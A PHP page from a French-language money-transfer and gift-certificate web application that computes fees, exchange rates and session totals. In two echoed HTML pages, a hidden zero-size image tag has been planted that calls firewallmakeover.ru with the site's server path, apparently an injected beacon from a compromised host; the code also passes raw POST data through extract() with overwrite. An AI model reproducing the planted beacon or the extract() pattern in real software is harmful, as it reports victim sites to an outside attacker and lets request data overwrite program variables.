<?php
/* Programme : TRanSactionCALculFeNeTre.php
* Description : Programme d'ajout de client.
* Auteur : Denis Léveillé 	 		  Date : 2007-03-28
 */
include('lib/config.php');

if( isset( $_POST['devise']) ) 
	$_SESSION['devise'] = CleanUp($_POST['devise']);

if( !isset( $_SESSION['devise'] ) )
	$_SESSION['devise'] = "CAD";
	
if( !isset( $_POST['btpanier']) && isset( $_GET['btpanier']) )
	$_POST['btpanier'] =  CleanUp($_GET['btpanier']);
else
	$_POST['btpanier'] =  CleanUp(@$_POST['btpanier']);

$TabPaie =  	get_money( "Paiement" );
$TabTrs =  		get_money( "Transfert" );
$TabService = 	get_service("OTHER");	   
$TabUnite = 	get_unite();
$TabModPay = 	get_Modepaye( 0, 0, 0 );
$TxCUC_USD =	get_TauxVente("CUC");  
$TXUSD_CAD = 	get_TauxVente("CAD"); 
$TXUSD_EUR = 	get_TauxVente("EUR");

$TxAchatCUC_USD = get_TauxVente("CUC");  

//									foreach($TabService as $clé => $valeur ) 									
//										echo "LaCle : ".$clé." => ".$valeur;
//	include( "session_initvar.inc");

$_SESSION['Prio'] = 10;
	
// **** Choix de la langue de travail ****
switch( $_SESSION['langue'] ) {
	case "en" : 	require_once("trsmessen.inc");
						require_once("extra/varmessen.inc");
						break;
	case "fr" : 	require_once("trsmessfr.inc");
						require_once("extra/varmessfr.inc");
						break;
	default : 		require_once("trsmesssp.inc"); 
						require_once("extra/varmesssp.inc"); 
} // switch SLangue



function AfficherErreur($texteMsg)
{ global $id, $Service,$Poids, $Transfert, $Assurance, $Douane, $Disponible, $Max, $DevDisp, $DevPaye, $CurTrans, $CoutUS, $FrTransant, 
  		 	$FrFixe, $Extra, $CoutLivreur, $TauxChg, $Plus, $Pourcent, $Total, $CodeP, $Surcharge, $ModePaye, 
			$TabService, $TabPaie, $TabTrs ,$TabUnite, $TabModPay, $TransUS,	$TxCUC_USD, $TXUSD_CAD, $TXUSD_EUR,
			$user,$host,$password,$database, $txt, $param, $Large, $Enligne, $Titre, $TabMessTrs,  $TabMessGen ;
	
	$_SESSION['Prio'] = 10;

	$NewMessage = $texteMsg;
	include("certificat_form.inc");
	exit();
}

switch( @$_POST['btpanier'] ) {
	case $txt['ajouter_votre_panier'] : 
							$_SESSION['Service'] = 0;
							unset($_SESSION['transaction']);
							unset($_SESSION['paiement']);
							$id = CleanUp( $_POST['id'] );
							$Titre = $txt['sommaire_du_certificat']." $id ";	
							echo	
							"<html>
								<head>
									<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
									<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
									<base target='MAIN'>
								</head>
							<body onload='javascript:pageonload()' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
								<form name='Certificat' METHOD='POST' ACTION='panier_traite.php?retour=0'>
											<input type='hidden' name='id' value='$id'/>
											<input type='hidden' name='cat' value='0'/>
											<input type='hidden' name='CodePanier' value='1'>
											<input type='hidden' name='qte' value='1'/>
							            <input type='hidden' name='Target' value='MAIN'>
							            <input type='hidden' name='btpanier' value='".$txt['ajouter_votre_panier']."'>
								</form>
								<script language='javascript'>
								function pageonload() {
									document.Certificat.submit();
								} // pageonload
								</script>
							</body>
							</html>";
						break;

	case $TabMessTrs[99]:	
	case 1:			
						foreach($_POST as $clé => $valeur ) {
								$valeur = CleanUp( $valeur );
//								echo "$clé : $valeur<br> ";
						}
						extract($_POST,EXTR_OVERWRITE);
 						$DevDisp = $_SESSION['devise'];
						$Titre = $txt['sommaire_du_certificat']." $id ";
						if( $Transfert != 0 ) {
							$Surcharge = get_surcharge($ModePaye);
							$TauxChg = get_TauxVente($DevDisp); 
							$ENoClient = 100;
							$DevPaye = $DevDisp;
							if( $DevPaye != "USD" )
								$TauxChg = get_TauxVente($DevPaye); 
//								$TauxChg = get_TauxAchat($DevPaye); 
							else
								$TauxChg = 1;
							
							if( !$Transfert && $Total ) 
								$Disponible = $Total;
							
							include( $acces_hermes."transcalc.inc");
							$Total .= '$';
							switch ( $ModePaye ) {
								case 1 : 
								case 2 :
								case 3 : 
								case 4 : 
								case 11: unset($_SESSION['paiement']);
											break;
								default:	
											break;
							} // Si mode de paiement
							$_SESSION['paiement']['ModePaye']		=	$ModePaye;
							$_SESSION['transaction']['Service']		=	$Service;
							$_SESSION['transaction']['Transfert']	=	$Transfert;
							$_SESSION['transaction']['TransUS']		=	$TransUS;
							$_SESSION['transaction']['FrTransant']	=	$FrTransant;
							$_SESSION['transaction']['FrFixe']		=	$FrFixe;
							$_SESSION['transaction']['CoutUS']		=	$CoutUS;
							$_SESSION['transaction']['CurTrans']	=	$CurTrans;
							$_SESSION['transaction']['Plus']			=	$Plus;
							$_SESSION['transaction']['Pourcent']	=	$Pourcent;
							$_SESSION['Totaux']['totalpourbanque']	=	$Total; 
							
//							echo "Taux ".$TxAchatCUC_USD."<br>";
							$Montant = $CoutUS / $TxAchatCUC_USD;
							update_certificat($id, $Montant);
						}
						else {
							unset($_SESSION['transaction']);
							$_SESSION['Totaux']['totalpourbanque']	=	0;
							AfficherErreur("Aucun montants fournit");
						}
						include( "certificat_form.inc");
						break;
	default:			foreach($_POST as $clé => $valeur ) {
								$valeur = CleanUp( $valeur );
//								echo "$clé Valeur : $valeur<br>";
						}
						if( isset($_SESSION['transaction']) && ($_SESSION['transaction']['Service'] == 5) ) {
							$Service		=	$_SESSION['transaction']['Service'];
							$Transfert	=	$_SESSION['transaction']['Transfert'];
							$TransUS		=	$_SESSION['transaction']['TransUS'];
							$FrTransant =	$_SESSION['transaction']['FrTransant'];
							$FrFixe		=	$_SESSION['transaction']['FrFixe'];
							$CoutUS		=	$_SESSION['transaction']['CoutUS'];
							$CurTrans	=	$_SESSION['transaction']['CurTrans'];
							$Pourcent	=	$_SESSION['transaction']['Pourcent'];
							$Plus			=	$_SESSION['transaction']['Plus'];
							$ModePaye	=	5; //$_SESSION['paiement']['ModePaye'];
							$Total		=	$_SESSION['Totaux']['totalpourbanque']; 
						}
						else {
							$_SESSION['Service'] = 0;
							unset($_SESSION['transaction']);
							unset($_SESSION['paiement']);
							$Service=5;
							$Transfert = "";
							$TransUS = $FrTransant = $FrFixe = $CoutUS = "";
							$CurTrans ="CUC";
							$Pourcent = $Plus = "";
							$ModePaye=5;
							$Total = $_SESSION['Totaux']['totalpourbanque'] = 0.0;
						}
						
						if( $id = get_certificat_libre(20) ) {
							$Poids = "";
							$Assurance = $Douane = "";
							$Disponible = 9999999;
							$Max = "";
							$DevPaye =  $_SESSION['devise'];
							$Extra = $CoutLivreur = "";
							$CodeP = "";
							$Surcharge = 0;
	 						$DevDisp = $_SESSION['devise'];
							$TauxChg = get_TauxVente($DevDisp);
							$Titre = $txt['sommaire_du_certificat']." ".$id." ";

							include( "certificat_form.inc");
						}
						else {
							echo	
							"<html>
								<head>
									<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
									<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
									<base target='MAIN'>
								</head>
							<body onload='javascript:pageonload()' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
								<p align=center><font size +2><b>NON DISPONIBLE</b></font></p><br>
							</body>
							</html>";
						}
						break;
} // switch
?>